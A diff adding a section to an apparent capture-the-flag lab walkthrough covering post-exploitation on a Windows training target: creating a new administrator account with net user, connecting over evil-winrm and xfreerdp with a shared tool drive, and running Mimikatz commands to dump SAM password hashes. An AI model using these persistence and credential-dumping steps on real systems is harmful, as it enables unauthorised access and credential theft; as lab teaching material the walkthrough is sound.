@@ -1012,3 +1012,118 @@ As this is a web exploit, we now have to URL encode the shell command. If using 
 ![image](https://user-images.githubusercontent.com/89842187/132019199-442dfad4-3571-42dc-a1b7-fbecd46e072c.png)
 
 f you are using cURL then there are a variety of options available. cURL does provide a --data-urlencode switch; however, it's often easiest to just use a website https://www.urlencoder.org/ to encode the shell command, then copy it in with the -d switch:
+
+## Stabilisation & Post Exploitation
+
+In the last task we got remote command execution running with the highest permissions possible on a local Windows machine, which means that we do not need to escalate privileges on this target.
+
+In the upcoming tasks we will be looking at the second teaching point of this network -- the command and control framework: Empire. Before we do that though, let's consolidate our position a little.
+
+From the enumeration we did on this target we know that ports 3389 and 5985 are open. This means that (using an account with the correct privileges) we should be able to obtain either a GUI through RDP (port 3389) or a stable CLI shell using WinRM (port 5985).
+
+Specifically, we need a user account (as opposed to the service account which we're currently using), with the "Remote Desktop Users" group for RDP, or the "Remote Management Users" group for WinRM. A user in the "Administrators" group trumps the RDP group, and the original Administrator account can access either at will.
+
+We already have the ultimate access, so let's create such an account! Choose a unique username here (your TryHackMe username would do), and obviously pick a password which you don't use anywhere else.
+
+First we create the account itself:
+
+```
+net user USERNAME PASSWORD /add
+
+```
+Next we add our newly created account in the "Administrators" and "Remote Management Users" groups:
+
+```
+net localgroup Administrators USERNAME /add
+net localgroup "Remote Management Users" USERNAME /add
+```
+
+![image](https://user-images.githubusercontent.com/89842187/132026193-64ef255c-492f-4ce6-9e5d-184115eb0a42.png)
+
+We can now use this account to get stable access to the box!
+
+As mentioned previously, we could use either RDP or WinRM for this.
+
+Note: Whilst the target is set up to allow multiple sessions over RDP, for the sake of other users attacking the network in conjunction with memory limitations on the target, it would be appreciated if you stuck to the CLI based WinRM for the most part. We will use RDP briefly in the next section of this task, but otherwise please use WinRM when moving forward in the network.
+
+Let's access the box over WinRM. For this we'll be using an awesome little tool called evil-winrm. https://github.com/Hackplayers/evil-winrm
+
+This does not come installed by default on Kali, so use the following command to install it from the Ruby Gem package manager:
+```
+sudo gem install evil-winrm
+```
+With evil-winrm installed, we can connect to the target with the syntax shown here:
+```
+evil-winrm -u USERNAME -p PASSWORD -i TARGET_IP
+```
+![image](https://user-images.githubusercontent.com/89842187/132026281-1218ffc4-66cd-490c-aeb6-2f580149a286.png)
+
+If you used an SSH portforward rather than sshuttle to access the Git Server, you will need to set up a second tunnel here to access port 5985. In this case you may also need to specify the target port using the -P switch (e.g. -i 127.0.0.1 -P 58950).
+
+Note that evil-winrm usually gives medium integrity shells for added administrator accounts. Even if your new account has Administrator permissions, you won't actually be able to perform administrative actions with it via winrm.
+
+Now let's look at connecting over RDP for a GUI environment.
+
+There are many RDP clients available for Linux. One of the most versatile is "xfreerdp" -- this is what we will be using here. If not already installed, you can install xfreerdp with the command:
+
+```
+sudo apt install freerdp2-x11
+
+```
+As mentioned, xfreerdp is an incredibly versatile tool with a vast number of options available. These range from routing audio and USB connections into the target, through to pass-the-hash attacks over RDP. The most basic syntax for connecting is as follows:
+
+```
+xfreerdp /v:IP /u:USERNAME /p:PASSWORD
+
+```
+
+Note that (as this is a command line tool), passwords containing special characters must be enclosed in quotes.
+
+When authentication has successfully taken place, a new window will open giving GUI access to the target.
+
+![image](https://user-images.githubusercontent.com/89842187/132026420-ebb1f047-358d-415e-bb83-1f73ae50a4d1.png)
+
+That said, we can do a lot more with xfreerdp. These switches are particularly useful:-
+
+- /dynamic-resolution -- allows us to resize the window, adjusting the resolution of the target in the process
+- /size:WIDTHxHEIGHT -- sets a specific size for targets that don't resize automatically with /dynamic-resolution
+- +clipboard -- enables clipboard support
+- /drive:LOCAL_DIRECTORY,SHARE_NAME -- creates a shared drive between the attacking machine and the target. This switch is insanely useful as it allows us to very easily use our toolkit on the remote target, and save any outputs back directly to our own hard drive. In essence, this means that we never actually have to create any files on the target. For example, to share the current directory in a share called share, you could use: /drive:.,share, with the period (.) referring to the current directory
+
+When creating a shared drive, this can be accessed either from the command line as \\tsclient\, or through File Explorer under "This PC":
+
+![image](https://user-images.githubusercontent.com/89842187/132026466-d10c4e96-7ca4-412d-83eb-ecfce72182de.png)
+
+Note that the name of the share will change according to what you selected in the /drive switch.
+
+A useful directory to share is the /usr/share/windows-resources directory on Kali. This shares most of the Windows tools stockpiled on Kali, including Mimikatz which we will be using next. This would make the full command:
+```
+xfreerdp /v:IP /u:USERNAME /p:PASSWORD +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share
+```
+
+With GUI access obtained and our Windows resources shared to the target, we can now very easily use Mimikatz to dump the local account password hashes for this target. Next we open up a cmd.exe or PowerShell window as an administrator (i.e. right click on the icon, then click "Run as administrator") in the GUI and enter the following command:
+\\tsclient\share\mimikatz\x64\mimikatz.exe
+
+![image](https://user-images.githubusercontent.com/89842187/132026501-8f40ed50-08ae-496c-b78f-07a880b5526b.png)
+
+Note: if you used a different share name, you would need to substitute this in. Equally, if the command errors out, you may need to install mimikatz on Kali with sudo apt install mimikatz.
+
+
+With Mimikatz loaded, we next need to give ourselves the Debug privilege and elevate our integrity to SYSTEM level. This can be done with the following commands:
+
+```
+privilege::debug
+token::elevate
+```
+
+![image](https://user-images.githubusercontent.com/89842187/132026551-ea61a3b6-5cb4-4ab6-bdf5-75cbb6743ebe.png)
+
+If we want we could log Mimikatz output with the log command. For example: log c:\windows\temp\mimikatz.log, would save the Mimikatz output into the Windows Temp directory. This could also be saved directly into our Kali machine, but be aware that the remote destination must be writeable to the local user running the RDP session.
+
+We can now dump all of the SAM local password hashes using:
+```
+lsadump::sam
+```
+Near the top of the results you will see the Administrator's NTLM hash:
+
+![image](https://user-images.githubusercontent.com/89842187/132026598-605ba75a-5457-450f-90d4-95c996c1bfb4.png)
